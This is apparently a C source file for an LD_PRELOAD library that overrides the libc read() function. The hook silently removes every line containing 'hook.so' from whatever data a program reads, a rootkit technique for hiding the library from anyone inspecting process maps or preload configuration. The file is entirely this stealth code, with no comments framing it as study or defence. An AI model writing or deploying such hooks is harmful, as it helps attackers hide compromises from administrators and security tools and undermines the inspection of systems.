#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>

ssize_t read(int fd, void *buf, size_t count) {
    ssize_t (*real_read)(int, void *, size_t) = dlsym(RTLD_NEXT, "read");
    ssize_t result = real_read(fd, buf, count);

    if (result > 0) {
        char *start = (char *)buf;
        char *match;

        size_t remaining = result;

        while ((match = memmem(start, remaining, "hook.so", 7)) != NULL) {
            char *buffer_root = (char *)buf;
            char *buffer_end = buffer_root + result;

            char *line_start = memrchr(buffer_root, '\n', match - buffer_root);
            line_start = line_start ? line_start + 1 : buffer_root;

            char *line_end = memchr(match, '\n', buffer_end - match);
            line_end = line_end ? line_end + 1 : buffer_end;

            size_t line_len = line_end - line_start;

            // Shift the remaining data forward
            memmove(line_start, line_end, buffer_end - line_end);

            // Update the global result size
            result -= line_len;

            // Move the scanning pointer forward to the modification point
            start = line_start;
            remaining = buffer_end - line_end;
        }
    }
    return result;
}


